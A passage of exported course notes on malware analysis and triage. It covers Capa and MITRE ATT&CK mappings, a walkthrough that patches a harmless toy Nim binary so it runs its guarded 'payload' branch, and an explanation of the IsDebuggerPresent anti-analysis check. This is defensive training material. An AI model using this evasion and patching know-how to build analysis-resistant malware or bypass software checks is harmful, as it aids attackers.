no other standard set of definitions has seen more use than MITRE ATT&amp;CK. It is an industry standard just about everywhere you go.</p> <p>For example, let's say you want high-level information about the types of tactics that adversaries use to gain initial access to a target network. The MITRE ATT&amp;CK Framework has a grouped list of items classified under TA0001 - Initial Access, that you can view in list form:</p> <p>https://attack.mitre.org/tactics/TA0001/</p> <p>Then, if you want more information about a specific initial access technique, like phishing, you can view the technique page for T1566 - Phishing:</p> <p>https://attack.mitre.org/techniques/T1566/</p> <p>And then, if you want an example of a more specific sub-technique of phishing, like spearphishing with an attachment, you can view the subtechnique T1566.001 - Spearphisning Attachment:</p> <p>https://attack.mitre.org/techniques/T1566/001/</p> <p>The pages in the ATT&amp;CK matrix have information about the specific tactic/technique, tools that can deploy this technique, mitigations, and detections. For example, T1566.001 - Spearphishing Attachments lists the known adversary groups that use this technique (which, for Spearphishing, is probably most adversaries!):</p> <p></p> <p>I highly recommend perusing the MITRE ATT&amp;CK matrix items. I can get lost in that website for hours learning about new tactics, techniques, and procedures. I also highly recommend becoming fluent in the ATT&amp;CK framework for report writing as it can be an exceptionally useful way to frame findings and information in industry common terms.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#capa-output","title":"Capa Output","text":"<p>Now, back to Capa! Capa has examined the binary, pulled out interesting information from the binary, matched it against its default rule set, and matched some suspected capabilities to items from the MITRE ATT&amp;CK Framework. This time, we don't have much to go on. We get a match for the ATT&amp;CK item \"T1129 - Shared Modules\".</p> <p>If we examine the matrix item for Shared Modules, we don't get a lot of useful information:</p> <p>https://attack.mitre.org/techniques/T1129/</p> <p>Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess, LoadLibrary, etc. of the Win32 API.</p> <p>This basically means that the malware is loading DLLs to perform malicious activity. That's not particularly revealing! Let's keep moving.</p> <p>Instructor's Note: it seems that the Shared Modules technique wasn't too useful at all and the Capa developers have removed the default rule for it! If you run Capa against this sample, there's a chance you will not see this as a listed technique. It's not particularly useful for our analysis, so please feel free to move on to the next section.</p> <p>If you want to see an example of how Capa can identify techniques, also feel free to run Capa against the WannaCry sample that we detonated earlier in the course.</p> <p>Malware Behavioral Catalog (MBC)</p> <p>The next output is the Malware Behavioral Catalog (MBC) Objectives and Behaviors. This is a similar classification system to MITRE ATT&amp;CK but focuses on malware specifically.</p> <p>The full MBC Matrix can be found here: https://github.com/MBCProject/mbc-markdown#malware-objective-descriptions</p> <p>MBC translates MITRE ATT&amp;CK items into terms that focus on the malware analysis use case. So understandably, we do get some useful output from this section:</p> <p></p> <p>Here, Capa has identified items of interest in the binary, matched them to rules based on MBC items, and returned the results. We've accurately identified that the Malware.Unknown.exe.malz sample has the capability to</p> <ul> <li>Send and receive data</li> <li>Do so over HTTP</li> <li>Create and terminate processes</li> </ul> <p>For a preliminary round of triage, that's pretty good! But let's keep going; the best is yet to come.</p> <p>Capa Rule Output</p> <p>The final block identifies Capa rule matches against the default Capa rule set. This is the most specific of the three outputs and gives us the best information for triage:</p> <p></p> <p>Like in the MBC output, the Capa rule output identifies that the malware can connect to a URL, send and receive data, and manipulate processes. At surface, there isn't much more information here than what we already have. But we do see the number of matches and the namespace for the rules in this output.</p> <p>Is there more going on under the hood of Capa? Yes, yes there is!</p> <p>Let's rerun Capa with the verbose flag <code>capa [C:\\path\\to\\Malware.Unknown.exe.malz] -v</code> and examine the output:</p> <p></p> <p>There's a lot more output here! Capa identifies the rule that is triggered for the binary, the type of rule, and even the location in the binary where the rule is triggered in hex form! We can start to see the mechanism here for how Capa identifies things that trigger the rules - it uses the Vivisect parser to examine interesting strings and byte patterns and matches them against the rules.</p> <p>Finally, let's run Capa one more time with a double verbose output <code>capa [C:\\path\\to\\Malware.Unknown.exe.malz] -vv</code> and examine the output:</p> <p></p> <p>There is tons of incredible information here and we can clearly see how Capa is now triggering the rules for this binary. For example:</p> <pre><code>download URL to file\nnamespace  communication/http/client\nauthor     matthew.williams@fireeye.com\nscope      function\nmbc        Communication::HTTP Communication::Download URL [C0002.006]\nexamples   F5C93AC768C8206E87544DDD76B3277C:0x100020F0, Practical Malware Analysis Lab 20-01.exe_:0x401040\nfunction @ 0x401080\nor:\n    api: urlmon.URLDownloadToFile @ 0x4010D9\n</code></pre> <p>The output for the \"download URL to file\" rule indicates that this rule triggers when the <code>urlmon.URLDownloadToFile</code> API call is located in the binary. It has identified this API call, provides the location in the binary where it is called, and provides some examples of where this kind of malware behavior has been seen before.</p> <p>Notice that for some rules, there are conditionals that can trigger the rule based on multiple criteria. For example:</p> <pre><code>create process (2 matches)\nnamespace  host-interaction/process/create\nauthor     moritz.raabe@fireeye.com\nscope      basic block\nmbc        Process::Create Process [C0017]\nexamples   9324D1A8AE37A36AE560C37448C9705A:0x406DB0, Practical Malware Analysis Lab 01-04.exe_:0x4011FC\nbasic block @ 0x4010E3\nor:\n    api: shell32.ShellExecute @ 0x401128\nbasic block @ 0x401142\nor:\n    api: kernel32.CreateProcess @ 0x4011AD\n</code></pre> <p>This rule identifies process creation based on the existence of the <code>ShellExecute</code> API call located in <code>shell32.dll</code> or the <code>CreateProcess</code> API call located in kernel32.dll.</p> <p>The documentation on Capa rule generation is located here: https://github.com/mandiant/capa-rules/blob/master/doc/format.md</p> <p>Summary Now that we understand the specifics of basic static analysis, we can turn to a tool like Capa to do a lot of the heavy lifting for us during triage. Capa can give us high-level information about what may be going on in the sample of interest. It's usually never enough information to draw a definitive conclusion, but it's a start! More analysis is necessary to uncover the ground truth for any given sample.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#3-basic-dynamic-analysis","title":"3. Basic Dynamic Analysis","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-basic-dynamic-analysis-intro-host-and-network-indicators","title":"Start Basic Dynamic Analysis Intro: Host and Network Indicators","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-initial-detonation-triage-hunting-for-network-signatures","title":"Start Initial Detonation &amp; Triage: Hunting for Network Signatures","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p> <p>(Note: we are still using the sample from the Basic Static Analysis section even though we are now in the Basic Dynamic section!)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-host-based-indicators-procmon-part-i","title":"Start Host-Based Indicators: Procmon Part I","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p> <p>(Note: we are still using the sample from the Basic Static Analysis section even though we are now in the Basic Dynamic section!)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-host-based-indicators-procmon-part-ii","title":"Start Host-Based Indicators: Procmon Part II","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p> <p>(Note: we are still using the sample from the Basic Static Analysis section even though we are now in the Basic Dynamic section!)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-dynamic-analysis-of-unknown-binaries-part-i-analyzing-wireshark","title":"Start Dynamic Analysis of Unknown Binaries Part I: Analyzing Wireshark","text":"<p>Sample for this section: Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-dynamic-analysis-of-unknown-binaries-part-ii-host-based-indicators","title":"Start Dynamic Analysis of Unknown Binaries Part II: Host-Based Indicators","text":"<p>Sample for this section: Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-analyzing-a-reverse-shell-part-i-correlating-iocs","title":"Start Analyzing a Reverse Shell Part I: Correlating IOCs","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-analyzing-a-reverse-shell-part-ii-parent-child-process-analysis","title":"Start Analyzing a Reverse Shell Part II: Parent-Child Process Analysis","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#4-challenge-1-sillyputty","title":"4. Challenge 1: SillyPutty","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-challenge-1-sillyputty-intro","title":"Start Challenge 1: SillyPutty Intro","text":"<p>Sample for this section: Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-challenge-1-sillyputty-walkthrough","title":"Start Challenge 1: SillyPutty Walkthrough","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#5-advanced-static-analysis-assembly-language-decompiling-disassembling-malware","title":"5. Advanced Static Analysis: Assembly Language, Decompiling, &amp; Disassembling Malware","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-intro-to-advanced-analysis-assembly-language","title":"Start Intro to Advanced Analysis &amp; Assembly Language","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-disassembling-decompiling-a-malware-dropper-intro-to-cutter","title":"Start Disassembling &amp; Decompiling a Malware Dropper: Intro to Cutter","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p> <p>Errata Please note that, depending on when you installed FLARE-VM, the installed tools may or may not include Cutter. If you don't see it when searching in the task bar, please download it from the official site here: https://cutter.re/</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-x86-cpu-instructions-memory-registers-the-stack-a-closer-look","title":"Start x86 CPU Instructions, Memory Registers, &amp; the Stack: A Closer Look","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-revisiting-the-dropper-assembly-instructions-and-the-windows-api","title":"Start Revisiting the Dropper: Assembly Instructions and the Windows API","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-hello-world-under-a-microscope-part-i","title":"Start Hello, World! Under a Microscope Part I","text":"<p>Samples for this section: Lab File(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-advanced-analysis-of-a-process-injector","title":"Start Advanced Analysis of a Process Injector","text":"<p>Sample for this section: Lab file(s)</p> <p>Errata At about 8:30 in this video, I made an error regarding different values that are moved in and out of EAX during the set up for the process injection. In short, I say that PID of an injected process is stored in EAX first, then moved into EDI after the call to OpenProcess returns. This is not technically true: what is returned to EAX after the OpenProcess call is not the PID of the process, but the handle to that process. This seems like a minor difference but handles are a completely different data type within the Windows OS and are used to interact with an instance of a process. TL;DR: once a process injector can get a handle to a process, it can use the handle with all of its remaining API calls to perform the injection.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#6-advanced-dynamic-analysis-debugging-malware","title":"6. Advanced Dynamic Analysis: Debugging Malware","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-getting-comfortable-in-x32dbg-flow-control-breakpoints","title":"Start Getting Comfortable in x32dbg: Flow Control &amp; Breakpoints","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-debugging-the-dropper-dynamic-analysis-of-x86-instructions-api-calls","title":"Start Debugging the Dropper: Dynamic Analysis of x86 Instructions &amp; API Calls","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-hello-world-under-a-microscope-part-ii","title":"Start Hello, World! Under a Microscope Part II","text":"<p>Samples for this section: Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#7-challenge-2-sikomode","title":"7. Challenge 2: SikoMode","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-challenge-2-sikomode-intro","title":"Start Challenge 2: SikoMode Intro","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-challenge-2-sikomode-walkthrough","title":"Start Challenge 2: SikoMode Walkthrough","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-bonus-lecture-live-analysis-of-challenge-2-sikomode-twitch-stream-with-taggart","title":"Start Bonus Lecture: Live Analysis of Challenge 2 SikoMode Twitch Stream with Taggart","text":"<p>Check out a Twitch stream that I did with Michael Taggart where we walk through a full analysis of Challenge 2: SikoMode. This stream is a crash course in everything that we have covered up to this point, including the philosophy of malware analysis and a brief overview of each phase of technical analysis.</p> <p>The analysis portion begins at 30:45.</p> <p>Link: https://youtu.be/noLjgnoKRLU?t=1841</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#8-binary-patching-anti-analysis","title":"8. Binary Patching &amp; Anti-analysis","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-patch-it-out-patching-x86-binaries","title":"Start Patch it out: Patching x86 Binaries","text":"<p>Sample for this section: Lab File(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#introduction_2","title":"Introduction","text":"<p>Our job as malware analysts is to discern what a malware specimen is doing. Sometimes, the malware is designed to prevent us from accomplishing that goal. We need to outsmart the malware when this is the case. Binary patching is one example of how we can outsmart the malware specimen!</p> <p>Let\u2019s examine a very simple binary patching technique. More importantly, I will walk through the methodology at the Assembly level so it\u2019s clear why binary patching even works in the first place.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#setting-up","title":"Setting Up","text":"<p>On FLAREVM, make a copy of main.exe called main2.exe:</p> <pre><code>PS C:\\Users\\husky&gt; cp .\\main.exe .\\main_2.exe\n</code></pre> <p>On FLAREVM, open Cutter and open main2.exe up in Cutter. Make sure to click the  \u201cLoad in write mode\u201d box</p> <p></p> <p>Let\u2019s examine the source code of this program so we have a strong reference point for when we dive into the ASM insanity.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#simplepatchme-source-code-mainnim","title":"SimplePatchMe Source Code - main.nim","text":"<pre><code>import std/httpclient\nimport nimcrypto\n\n\nproc evaluate_http_body(): bool =\n    try:\n        # Download key from endpoint\n        var client = newHttpClient()\n        var res =  client.request(\"http://freetshirts.local/key.crt\")\n        let key_contents = res.body\n        # Compute SHA256 of body of response\n        let sha256sum = sha256.digest(key_contents)\n\n        return $sha256sum == \"221E8347990B3F77531D55AA7B11969A47DBF53ACDEDD611EFD4D12112F352D3\"\n\n    except Exception as e:\n        echo \"[-] Error: \" &amp; e.msg\n        return false\n\nproc run_payload(): void =\n    echo \"[!] Boom!\"\n\n\nwhen isMainModule:\n    var res = evaluate_http_body()\n    if res:\n        run_payload()\n    else:\n        echo \"[-] No dice, sorry :(\"\n</code></pre> <p>The program performs a GET request to http://freetshirts.local/key.crt and writes the body of the response to a variable. Then, it calculates the SHA256sum of the body of the response and compares it to a preset value. If the two values are the same, it executes the <code>run_payload()</code> procedure, which simply prints <code>[+] Boom!</code>. If the SHA256sum does not match the preset value, it says <code>[-] No dice, sorry :(</code>. This program is extremely simple to allow for better clarity when we get into the ASM and decompiled output in Cutter.</p> <p>In Cutter, we open the <code>main()</code> function in the Decompiler panel:</p> <p></p> <p>Recall that a Nim compiled program will have a few wrapper functions around the true <code>main()</code> function, so we will need to drill down a few levels. Double click on <code>_NimMain()</code></p> <p></p> <p>We can ignore <code>_PreMain()</code> and <code>_initStackBottomWith()</code> for now. These two functions are boilerplate for Nim compiled binaries. We can click on the <code>_NimMainInner</code> value to jump to the <code>NimMainInner()</code> function:</p> <p></p> <p>And finally, we get to the true main() of a Nim program: <code>NimMainModule()</code> </p> <p>The <code>main()</code> module of a Nim program is nested this far down because the source code for a typical Nim binary looks like this:</p> <pre><code>proc do_a_thing(): void = \n    echo \"[+] Thing is now done!\"\n\nwhen isMainModule:\n    do_a_thing()\n</code></pre> <p>Double click on the <code>NimMainModule()</code> function to go to the real heart of the program:</p> <p></p> <p>What are we working with here? The symbols of this binary have been left in, so the function names are nice and easy to read. Two of them are interesting here: <code>evaluate_http_body()</code> and <code>run_payload()</code>. Graph view may help us understand what is going on:</p> <p></p> <p>The call to <code>evaluate_http_body()</code> splits this graph into two paths. One path runs the <code>run_payload()</code> function that we saw in the source code <code>[+] Boom!</code>. The other path echoes the other string <code>[-] No dice, sorry :(</code> </p> <p>The <code>jne 0x43f1c0</code> instruction splits the program into two paths. Let\u2019s start at this split and work our way upwards.</p> <p></p> <p><code>jne</code> stands for <code>(J)ump if (N)ot (E)qual</code> to, which really means \u201cJump if the condition is not met.\u201d What condition, exactly? The one on the previous instruction, which is <code>test al,al</code></p> <p><code>test</code> is used to perform the logical <code>bitwise AND</code> operation on two operands. In this case, we are <code>AND</code>\u2019ing the contents of al against itself. <code>al</code> is the lower 8 bits of the <code>eax</code> register. Basically, when a function is executed, its return value will be stored in <code>eax</code> for comparison and evaluation. If it\u2019s small enough, it can be stored in al because <code>al</code> is only 8 bits.</p> <p></p> <p>Source: https://www.cs.virginia.edu/</p> <p>Now, the result of test al, al instruction sets the Zero Flag (ZF), Sign Flag (SF), and Parity Flag (PF) registers to certain values. For the purpose of this demonstration, we can ignore Sign Flag and Parity Flag and focus on Zero Flag.</p> <p>The Zero Flag can be either \u201c1\u201d or \u201c0\u201d (imagine that) and is set based on the result of the previous test instruction. test will set the ZF to one value or the other based on the result of the bitwise AND.</p> <p>If the Zero Flag is equal to 0, the JNE instruction will be taken. If the Zero flag is equal to 1, the JNE instruction will not be taken. When you see the program splitting to one path or the other because of a JNE instruction, it\u2019s going one way or the other way depending on if the Zero Flag is set (equal to zero).</p> <p>One instruction higher than the <code>test al, al</code> is <code>xor eax,1</code>. This is the true deciding point in the program, because the value of eax has been set by the <code>evaluate_http_body()</code> function:</p> <p></p> <p></p> <p>We know from the source code that the <code>evaluate_http_body()</code> function returns a Boolean value. So let\u2019s examine the result of XORing a 1 against a resulting TRUE and FALSE value:</p> <p>True Case</p> <p></p> <p>False Case</p> <p></p> <p>So depending on if the returned value from <code>evaluate_http_body()</code> is TRUE or FALSE, our XOR operation returns either a 1 or a 0. If the result was TRUE, our XOR returns a 0. If FALSE, it returns a 1.</p> <p>This is then evaluated by test al, al where the Zero Flag will be set to 0 or 1 depending on the result. Finally, the <code>jne [location]</code> instruction sends us to one side of the graph or the other.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#ok-so-what-does-this-actually-do","title":"Ok, so what does this actually do?","text":"<p>So let\u2019s back up for a second. So far, we are:</p> <ul> <li>Doing a thing (<code>evaluate_http_body()</code>)</li> <li>Writing the return value of the thing to a variable (TRUE or FALSE)</li> <li>XOR this result against the value of 1 (<code>xor eax,1</code>)</li> <li>TEST the resulting value of the eax register and set the Zero Flag based on the - result of this TEST (<code>test al, al</code>).</li> <li>Jump to one side of the code path if ZF == 0, and jump to the other side if ZF == 1 (<code>jne [memory address]</code>).</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#the-problem-here","title":"The Problem Here","text":"<p>Let\u2019s assume for this example that this is a piece of malware that calls to http://freetshirts.local and grabs the body of the endpoint at <code>key.crt</code>. And let\u2019s assume that this endpoint is now offline, or has been changed.</p> <p>We know the payload triggers if the SHA256 sum of the contents of <code>key.crt</code> equals a pre-defined SHA256 in the binary. We can even see this in plain text in the binary itself. So what\u2019s the issue?</p> <p>The issue is that there is no possible way we could know the contents of that endpoint at this point. We have a SHA256 hash, but it is basically impossible to reverse the SHA256 sum back into its original contents. </p> <p>So if we ever want this binary to trigger and get to the <code>run_payload()</code> code path, we\u2019re basically out of luck.</p> <p>Or, are we?</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#the-patch","title":"The Patch","text":"<p>We\u2019re going to patch this binary so it will run the payload regardless of the result of the evaluate_http_body() function.</p> <p>This binary exists on our machine. We have full control over it. Who says we can\u2019t write new instructions inside of it? Who says we can\u2019t manipulate the bytes themselves to bend them to our will? We can and we will do just that.</p> <p>The basic idea here is to insert or alter instructions into the binary so it will reach our intended code path, regardless of how the program is supposed to run. There are plenty of ways to do this, but let\u2019s keep it very simple for this run.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#running-and-patching-the-exe","title":"Running and Patching the Exe","text":"<p>On FLAREVM, add freetshirts.local to your <code>hosts</code> file and have it point to <code>127.0.0.1</code></p> <p>The binary throws an exception if there is no webserver to talk to at all:</p> <pre><code>PS C:\\Users\\husky&gt; .\\main.exe\n[-] Error: No connection could be made because the target machine actively refused it.\n\n[-] No dice, sorry :(\n</code></pre> <p>So if we stand up a webserver, we can run the binary again and get a different result. Remember, we need a <code>key.crt</code> file, though we don\u2019t know what the contents would have been:</p> <p></p> <pre><code>C:\\Users\\husky&gt;python -m http.server 80\nServing HTTP on :: port 80 (http://[::]:80/) ...\n\nPS C:\\Users\\husky&gt; .\\main.exe\n[-] No dice, sorry :(\n</code></pre> <p>This is still not the result that we want, so we must patch!</p> <p>Back in Cutter, go to the <code>jne</code> instruction and open it up in the Disassembler:</p> <p></p> <p>To patch this, we have tons of options. We can make sure that the value is different by the time it hits this XOR instruction. Or we could insert a JMP to jump over this code block completely. But why not keep it simple?</p> <p>The opposite of jne is je, which is Jump if Equal To. This does the exact opposite of jne: if the Zero Flag is set to 1, the jump will be taken. So let\u2019s patch this by changing the jne instruction to a je. What will that do?</p> <p>Well, let\u2019s see!</p> <p>Right click on the jne instruction and select \u201cEdit \u2192 Reverse Jump\u201d:</p> <p></p> <p>Now, save and close out of Cutter. We should still have our two binaries and our Rizin database file:</p> <pre><code>PS C:\\Users\\husky&gt; ls main*\n\n    Directory: C:\\Users\\husky\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         7/30/2022   2:23 PM         634150 main.exe\n-a----         7/30/2022   2:23 PM         634150 main2.exe\n-a----         7/30/2022   2:29 PM        6277600 main2.exe.rzdb\n</code></pre> <p>Now we test our patched binary:</p> <pre><code>PS C:\\Users\\husky&gt; .\\main.exe\n[-] No dice, sorry :(\nPS C:\\Users\\husky&gt; .\\main2.exe\n[!] Boom!\n</code></pre> <p>\u2026and it woks!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#summary_1","title":"Summary","text":"<p>In this section, we examined a simple binary patching technique. The malicious program was designed to only trigger if it met a certain condition, but we rewrote the bytes of the binary to coerce it to trigger anyway. This technique is simple but extremely powerful. Next, we will iterate on this technique to learn how to defeat more complex forms of anti-analysis.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#start-identifying-defeating-anti-analysis-techniques","title":"Start Identifying &amp; Defeating Anti-analysis Techniques","text":"<p>simpleAntiAnalysis Lab</p> <p>Let\u2019s pivot the concept of binary patching into one of its adjacent and practical use cases: defeating anti-analysis techniques.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#anti-analysis-techniques","title":"Anti-analysis Techniques","text":"<p>Anti-analysis is the broad term for a multitude of techniques that malware authors use to disrupt the malware analysis process. Anti-analysis can be as general as obfuscation, where malware samples are filled with junk strings, null byte overlays, and other random detritus.</p> <p>But more specifically, anti-analysis also means when a malware author puts special code in a malware sample to detect when it is being examined and deter the examination. Malware authors may code their malware to identify when it is being debugged, identify if it is in a virtual machine, and even identify if it is in a specific environment like FLARE-VM! Malware analysis is always a cat-and-mouse game when it comes to identifying and outsmarting the bad guys.</p> <p>The pertinent MITRE ATT&amp;CK Matrix items for anti-analysis include T1497 - Virtualization/Sandbox Evasion and its sub-techniques, and T1622 - Debugger Evasion, among others. Additionally, the use of execution guardrails (T1480 and its sub-techniques) can be considered anti-analysis. All of these techniques belong to the Defense Evasion tactic:</p> <ul> <li>Virtualization/Sandbox Evasion</li> <li>Debugger Evasion</li> <li>Execution Guardrails</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#isdebuggerpresent-api-call","title":"IsDebuggerPresent() API Call","text":"<p>Let\u2019s begin by examining the quintessential anti-analysis technique: the IsDebuggerPresent() API call. This technique is a na\u00efve form of anti-analysis in which the malware sample detects the presence of a debugger that is attached to its process. It will alter the flow of the program in response to the debugger and exit from the program without triggering its payload.</p> <p>This technique is quite easy to detect and defeat, but it is an excellent introduction to the anti-analysis methodology and how to counter it.</p> <p>Locate the executable sample in simpleAntiAnalysis Lab and copy it to the FLARE-VM Desktop. For the purpose of this lab, we will skip right to the Advanced Static Analysis portion. Open the simpleAntiAnalysis-cpp.exe binary in Cutter to begin analysis.</p> <p></p> <p>This sample is a 64-bit binary written in C++ and weighs in at a whopping 313KB. String analysis indicates that this sample has been cross-compiled from Linux using the Minimum GNU Compiler for Windows (mingw).</p> <p>In Cutter, locate the WinMain method within the binary and double click to load into that method:</p> <p></p> <p>Then, switch to the Graph View:</p> <p></p> <p>The sample performs its main work here in this method. The first interesting thing here is the presence of the <code>IsDebuggerPresent()</code> API call. Let\u2019s examine the Microsoft documentation for this API call:</p> <p>IsDebuggerPresent function (debugapi.h) - Win32 apps</p> <p></p> <p></p> <p>The API call is quite straightforward. This returns a Win BOOL value depending on if the program detects an attached debugger.</p> <p>The core of the logic of the debugger check exists in these instructions:</p> <p></p> <p>First, the <code>IsDebuggerPresent()</code> API call occurs. The specifics of how a debugger is detected is not particularly interesting for our purposes. What is interesting, however, is the return value that is loaded into <code>EAX</code> after this call returns. Like the documentation says, the program sets the value of EAX to 1 if a debugger is detected and sets the value of EAX to 0 if a debugger is not detected. </p> <p>Then, the program performs a bitwise <code>AND</code> of the value of <code>EAX</code>. We\u2019ve seen this before in the Binary Patching section (https://notes.huskyhacks.dev/notes/on-patching-binaries). The bitwise <code>AND</code> of <code>EAX</code> will set the Zero Flag (ZF) to 1 or 0. This effectively means the Zero Flag is set depending on if a debugger is detected or not.</p> <p>Note: though this binary is 64-bit, EAX is used here to perform the <code>TEST</code> instruction. This is because in 64-bit architecture, the smaller registers can still be used if the values are small enough to fit in them. That\u2019s why you see values moving in and out of AL, EAX, and the like.</p> <p></p> <p>Then the program performs a <code>SETNE</code> <code>AL</code> (SET If Not Equal To) instruction call. We have not seen this instruction before, but it is quite simple:</p> <pre><code>SETNE/SETNZ - Set if Not Equal / Set if Not Zero (386+)\n\nUsage:  SETNE   dest\n        SETNZ   dest\nModifies flags: none\n\nSets the byte in the operand to 1 if the Zero Flag is clear, otherwise sets the operand to 0.\n</code></pre> <p>Simply put, <code>SETNE</code> <code>AL</code> sets the value of <code>AL</code> (the lower bits of <code>EAX</code>) to 1 or 0 depending on if the Zero Flag is clear or not. Here, the program has determined if a debugger is present based on the return value of the <code>IsDebuggerPresent()</code> call and is now prepping the memory registers to jump to another set of instructions.</p> <p>Finally, the value of <code>AL</code> is <code>TEST</code>ed against itself. This is again similar to what we saw in the Binary Patching sample. This <code>TEST</code> instruction sets the Zero Flag to 1 or 0 depending on the contents of <code>AL</code>.</p> <p>In the previous section on Binary Patching , we saw the <code>JNE</code>(Jump If Not Equal To) instruction. <code>JNE</code> controlled the flow of the program based on if the Zero Flag was set to 1 or 0. In this program, we have a similar instruction, which is <code>JE [Memory Location]</code> (Jump if Equal To). JE evaluates the Zero Flag and acts as the inverse instruction: if the Zero Flag is equal to 1, the jump is taken. If the Zero Flag is equal to 0, the jump is not taken.</p> <p></p> <p>In this case, the Jump here directs the program to the proper detonation of the malware, where a simple message box pops up and says that the coast is clear!</p> <p></p> <p></p> <p>However, the opposite code path pops up a message box that identifies that a debugger is present. We can load this program into x64dbg and run the program (F9) until we see the message box:</p> <p></p> <p>Ok, So What Does This Actually Do?</p> <ul> <li>The program calls <code>IsDebuggerPresent()</code>. If a debugger is present, a 1 is stored in EAX. Otherwise, a 0 is stored in <code>EAX</code>.</li> <li>This value is <code>TEST</code>ed against itself. The value undergoes a bitwise <code>AND</code> operation. Bitwise <code>AND</code> of a two values result in a value of 0 if the operands are both 0. If this value ends up being 0, the Zero Flag is set.</li> <li><code>SETNE</code> <code>AL</code> evaluates the Zero Flag. If the Zero Flag is clear, <code>SETNE</code> sets the value of <code>AL</code> to 1. In the opposite case, it sets the value of <code>AL</code> to 0.</li> <li>Whatever value is placed in <code>AL</code> is <code>TEST</code>ed against itself, and the Zero Flag is set to 1 or 0 again.</li> <li>The <code>JE [memory address]</code> evaluates the Zero Flag and jumps to the memory location if it equals 1 and proceeds to the other code path if the Zero Flag is 